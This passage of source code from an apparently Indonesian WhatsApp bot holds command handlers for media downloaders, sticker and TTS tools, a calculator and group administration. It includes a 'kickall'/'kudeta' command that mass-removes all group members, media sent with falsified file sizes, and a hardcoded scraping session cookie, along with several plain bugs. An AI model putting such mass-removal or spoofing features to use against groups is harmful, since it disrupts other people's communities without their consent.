let tbk = await tebakAngka(text);
m.reply(tbk)
break

case 'igdl2': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply("Example: .igdl ig reels\n\nonly reels")
async function igdl(url) {
  return new Promise(async (resolve, reject) => {
    const payload = new URLSearchParams(
      Object.entries({
        url: url,
        host: "instagram"
      })
    )
    await axios.request({
      method: "POST",
      baseURL: "https://saveinsta.io/core/ajax.php",
      data: payload,
      headers: {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        cookie: "PHPSESSID=rmer1p00mtkqv64ai0pa429d4o",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {      
      const $ = cheerio.load(response.data)
      const mediaURL = $("div.row > div.col-md-12 > div.row.story-container.mt-4.pb-4.border-bottom").map((_, el) => {
        return "https://saveinsta.io/" + $(el).find("div.col-md-8.mx-auto > a").attr("href")
      }).get()
      const res = {
        status: 200,
        media: mediaURL
      }
      resolve(res)
    })
    .catch((e) => {
      console.log(e)
      throw {
        status: 400,
        message: "error",
      }
    })
  })
}
let kanjutgedeu = await igdl(text)
KhaerulZx.sendMessage(m.chat, {video: {url: kanjutgedeu.media}, caption: mess.success}, {quoted: m})
}
break
/**
 * 
 * [ *Case SendEvent* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'event': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!args[0]) return await m.reply(`Enter a list of events, Example: ${prefix + command} Event Name|Event Description|Event Location|Event Link`)
  if (!m.isGroup) return reply("khusus di grup")


function anu(vl, cylic) {
  return vl && vl.trim() ? value.trim() : cylic
}

  let [cName, cDesc, cLoc, cLink] = text.split("|").map((item) => item.trim())
  cName = anu(cName, 'Event')
  cDesc = anu(cDesc, 'Ada acara nie')
  cLoc = anu(cLoc, 'Indonesia')
  cLink = anu(cLink, 'https://cylic.vercel.app')

  let msg = generateWAMessageFromContent(m.chat, {
    messageContextInfo: {
      messageSecret: randomBytes(32)
    },
    eventMessage: {
      isCanceled: false,
      name: cName,
      description: cDesc,
      location: {
        degreesLatitude: 0,
        degreesLongitude: 0,
        name: cLoc
      },
      joinLink: cLink,
      startTime: new Date().getTime() + 86400000
    }
  }, {})

  return KhaerulZx.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  })
//Sumber Fungsinya dari: https://whatsapp.com/channel/0029Vai9MMj5vKABWrYzIJ2Z
}
break
case 'igvid': case 'igmp4': case 'instagram': case 'ig': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);
    let res;
    try {
        res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    } catch (error) {
        return m.reply(`An error occurred: ${error.message}`);
    }
    let api_response;
    try {
        api_response = await res.json();
    } catch (error) {
        return m.reply(`Failed to parse API response: ${error.message}`);
    }
    if (!api_response || !api_response.result || api_response.result.length === 0) {
        return m.reply(`No video or image found or Invalid response from API.`);
    }
    try {
        const mediaData = api_response.result[0];
        const mediaURL = mediaData.url;
        const cap = `HERE IS THE VIDEO`;
        let vidnya = await prepareWAMessageMedia({ video: await fetch(mediaURL) }, { upload: KhaerulZx.waUploadToServer });
        let msgii = await generateWAMessageFromContent(m.chat, {
            videoMessage: {
                ...vidnya.videoMessage,
                caption: cap
            }
        }, { userJid: m.sender, quoted: m });

        await KhaerulZx.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });

    } catch (error) {
        return m.reply(`Failed to send media: ${error}`);
    }
}
break;
case 'igfoto': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);
    let res;
    try {
        res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    } catch (error) {
        return m.reply(`An error occurred: ${error.message}`);
    }
    let api_response;
    try {
        api_response = await res.json();
    } catch (error) {
        return m.reply(`Failed to parse API response: ${error.message}`);
    }
    if (!api_response || !api_response.result || api_response.result.length === 0) {
        return m.reply(`No video or image found or Invalid response from API.`);
    }
    try {
        const mediaData = api_response.result[0];
        const mediaURL = mediaData.url;
        const cap = `HERE IS THE PHOTO`;
        let fotonya = await prepareWAMessageMedia({ image: await fetch(mediaURL) }, { upload: KhaerulZx.waUploadToServer });
let msgii = await generateWAMessageFromContent(m.chat, {
    imageMessage: {
        ...fotonya.imageMessage,
        caption: cap
    }
}, { userJid: m.sender, quoted: m });
await KhaerulZx.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    } catch (error) {
        return m.reply(`Failed to send media: ${error}`);
    }
}
break;
case 'spotify': case 'spotifysearch': case 'spotifys': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return reply('Masukkan judul lagunya!\ncontoh: .spotify sephia');
    let result = await searchSpotify(text);
    let songs = result.slice(0, 20);
    let caption = `*SPOTIFY SEARCH*\nGunakan command .spdl <link> untuk mendownload audio\n\n`;
    caption += songs.map((v, i) => `${i + 1}. Judul: ${v.name}\nLink: ${v.link}`).join("\n\n");
    KhaerulZx.sendMessage(m.chat, { text: caption }, { quoted: m });
}
break;
case 'spdl': case 'spotifydl': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nᴋʜᴀᴇʀᴜʟ`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await KhaerulZx.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    KhaerulZx.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'Finsii' }, { quoted: m });
}
break
case "chwa": {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply("Mana linknya?")
try {
  var { data } = await require("axios").get("https://manaxu-seven.vercel.app/api/others/chwa?query=" + text)
  var { name, follower, description } = data.result
  var x = `*Name:* ${name}\n*Followers:* ${follower}\n*Description:* ${description}`
  m.reply(x)
} catch (e) {
return m.reply("fitur eror")
}
}
break
case 'play': {
    if (banned.includes(m.sender)) {
        return;
    }
    reply(mess.wait);
    let yts = require("yt-search");
    if (!text) return m.reply(`*Contoh*: ${prefix + command} Hujan utopia`);
    try {
        let search = await yts(text);
        let anup3k = search.videos[0];
        let { title, url } = anup3k;
        let procees = await (await fetch(`https://widipe.com/download/ytdl?url=${url}`)).json();
        
        let doc = { 
            audio: {
                url: procees.result.mp3
            },
            mimetype: 'audio/mp4',
            fileName: `${title}`
        };
        
        await KhaerulZx.sendMessage(m.chat, doc, { quoted: m });
    } catch (e) {
        reply('Terjadi error, silahkan gunakan cmd alternatif .play2');
    }
}
break;
case 'play2' : {
if (banned.includes(m.sender)) {
    return;
    }
 if (!text) return reply('Enter Title / Link From YouTube!');
 reply("Wait")
 try {
 	let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio Tidak Ditemukan');
 if (convert.seconds >= 3600) {
 return reply(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 reply("Wait")
 audioUrl = await youtube(convert.url);
 }

 await KhaerulZx.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break
case 'toonce':
            case 'toviewonce': {
            if (banned.includes(m.sender)) {
    return;
    }
                if (!quoted) return reply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
                    KhaerulZx.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
                    KhaerulZx.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
                   KhaerulZx.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
    case 'dalle': {
    if (banned.includes(m.sender)) {
    return;
    }
	if (!text) return reply(`*☘️ Example :* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: KhaerulZx.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363247886007681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await KhaerulZx.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
case 'vidio': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.quoted) return reply('Reply Pesan Yang Mengandung Link YouTube')
let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
let urlIndex = parseInt(text) - 1;
if (urlIndex < 0 || urlIndex >= urls.length) return reply('Indeks URL tidak valid');
await downloadMp4(urls);
}
break

case 'audio': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.quoted) return reply('Reply Pesan Yang Mengandung Link YouTube');
let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
let urlIndex = parseInt(text) - 1;
if (urlIndex < 0 || urlIndex >= urls.length) 
return reply('Indeks URL tidak valid');
await downloadMp3(urls);
}
break

/*case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\nResult From '+text+'\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
}
KhaerulZx.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break */
       case 'mediafire': {
 if (banned.includes(m.sender)) return; 
 if (!isPrem && global.db.data.users[sender].limit < 1) 
 return reply('Maaf Kak, Limit Anda Habis. Ingin Membeli Limit? Ketik .buylimit');
  db.data.users[sender].limit -= 1;
 if (!args[0]) return reply(`Masukkan link Mediafire setelah perintah`);
 if (!args[0].match(/mediafire/gi)) return reply(`Link tidak benar`);
 const axios = require('axios');
 try {
 const url = args[0];
 const apiURL = `https://api.zenkey.my.id/api/download/mediafire?url=${url}&apikey=zenkey`;
 const { data } = await axios.get(apiURL);
 if (!data || data.status !== true) {
 return reply(`Gagal mengambil data. Coba lagi nanti.`);
 }
 const { filename, size, uploaded, extension, mime, link: downloadUrl } = data.result;
 const caption = `
 ≡ *MEDIAFIRE DOWNLOAD*

▢ *Nama File:* ${filename}
▢ *Ukuran:* ${size}
▢ *Ekstensi:* ${extension}
▢ *Diunggah:* ${uploaded}
`.trim();
 KhaerulZx.sendMessage(
 m.chat, 
 { document: { url: downloadUrl }, fileName: filename, mimetype: mime, caption: caption }, 
 { quoted: m }
 );
 } catch (error) {
 console.error(error);
 reply(`Terjadi kesalahan saat mengunduh file. Coba lagi nanti.`);
 }
}
break
    /**
 * 
 * [ *STICKER QUOTE CHAT* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

/*web error:  https://quote.lyo.su/quote/generate 
diganti dengan: https://quotly.netorare.codes/generate */

/*case "qc2": {
if (!quoted){
const getname = await KhaerulZx.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://quotly.netorare.codes/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: "MichieAI", author: "" }
KhaerulZx.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://quotly.netorare.codes/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: "MichieAI", author: "" }
KhaerulZx.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break*/
case 'qc2':
case 'qcstick': {
if (banned.includes(m.sender)) {
    return;
    }
if (!args[0]) return m.reply(`Contoh: ${prefix+command} white halo`)
if (!args[1]) return m.reply(`Contoh: ${prefix+command} white halo`)
if (text.length > 80) return m.reply(`Maximal 80 karakter!`)
KhaerulZx.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#f68ac9';
break;
case 'blue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#6cace4';
break;
case 'red':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#f44336';
break;
case 'green':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#4caf50';
break;
case 'yellow':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#ffeb3b';
break;
case 'purple':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#9c27b0';
break;
case 'darkblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#0d47a1';
break;
case 'lightblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#03a9f4'; 
break;
case 'ash':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#9e9e9e';
break;
case 'orange':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#ff9800';
break;
case 'black':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#000000';
break;
case 'white':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#ffffff';
break;
case 'teal':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#008080';
break;
case 'lightpink':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#A52A2A';
case 'salmon':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF1493'; 
break; 
case 'fire':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#B22222';
break;
case 'skyblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#00BFFF';
break; 
case 'orange':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#008000'; 
break; 
case 'navyblue':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#191970'; 
break; 
case 'darkorange':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#483D8B'; 
break;
case 'gold':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#FFD700'; 
break;
case 'silver':
if (banned.includes(m.sender)) {
    return;
    }
backgroundColor = '#C0C0C0'; 
break;
default:
return m.reply('Warna tersebut tidak ditemukan!')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await KhaerulZx.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/2324daab2ea7ce51596fa.jpg'),
} },
text: message,
replyMessage: {},
}, ],
};
let response = await axios.post('https://quotly.netorare.codes/generate', obj, {
headers: {
'Content-Type': 'application/json', },
});
let buffer = Buffer.from(response.data.result.image, 'base64');
KhaerulZx.sendImageAsSticker(m.chat, buffer, m, { packname: ``, author: `${author}`})
}
break
    case 'qc': {
    if (banned.includes(m.sender)) {
    return;
    }
                
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau replyq teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 100) return m?.reply('Maksimal 100 Teks!')
let ppnyauser = await await KhaerulZx.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/320b066dc81928b782c7b.png')
const rest = await quote(text, pushname, ppnyauser)
KhaerulZx.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
        case "tts":
        if (banned.includes(m.sender)) {
    return;
    }
        {
        if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          KhaerulZx.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          });
        }
        break; 
                 case 'vn':
        {
        if (banned.includes(m.sender)) {
    return;
    }
        if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
                    KhaerulZx.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: 'audio/mp4',
            ptt: true,
          });
        }
        break;
                case 'tiktokstalk':{
                if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!q) return reply(`Example: ${prefix+command} username`)
KhaerulZx.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
await KhaerulZx.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
await KhaerulZx.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}

break          
case "kalkulator":  
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
//=================== G R O U P =====================//
case 'totag': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
KhaerulZx.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'linkgc':
case 'linkgroup':
case 'linkgrup': {
    if (!m.isGroup) return reply(mess.group);
    if (!isBotAdmins) return reply(mess.badm);
    await loading();
    let response = await KhaerulZx.groupInviteCode(from);
    let groupLink = `https://chat.whatsapp.com/${response}`;
        let msgText = `*Link Group: ${groupMetadata.subject}*\n${groupLink}\n\nSalin link grup di atas untuk bergabung.`;
    await KhaerulZx.sendMessage(from, { text: msgText }, { quoted: m });
}
break;
case 'resetlinkgc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
KhaerulZx.groupRevokeInvite(from)
}
break
case 'sendlinkgc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await KhaerulZx.groupInviteCode(from)
KhaerulZx.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'kickall': case 'kudeta': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply("Khusus Grup\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV")
if (!isCreator) return reply(mess.owner)
if (!isBotAdmins) return reply(mess.botAdmin)
  const kickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kickall) {
 await KhaerulZx.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 m.reply(`Success`);
}
break
case 'listwarn': {
if (banned.includes(m.sender)) {
return;
}
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
if (!m.isGroup) return reply(mess.group);
if (!warns[m.chat] || Object.keys(warns[m.chat]).length === 0) {
return reply('Tidak ada anggota grup yang memiliki peringatan disini.');
}
const groupMetadata = await KhaerulZx.groupMetadata(m.chat);
const groupName = groupMetadata.subject;
let warnList = `ini Adalah Daftar Peringatan Anggota ${groupName} :\n`;
    for (let user in warns[m.chat]) {
        warnList += `@${user.split('@')[0]}: ${warns[m.chat][user]} peringatan\n`;
    }
    reply(warnList);
}
break;
case 'delwarn': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);
    
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (!warns[m.chat] || !warns[m.chat][users]) {
        return reply(`Anggota @${users.split('@')[0]} tidak memiliki peringatan.`);
    }
    warns[m.chat][users] -= 1;
    if (warns[m.chat][users] <= 0) {
        delete warns[m.chat][users];
        reply(`Anggota @${users.split('@')[0]} telah berhasil dihapus semua peringatannya.`);
    } else {
        reply(`Peringatan anggota @${users.split('@')[0]} berhasil dihapus. Total peringatan saat ini: ${warns[m.chat][users]}`);
    }
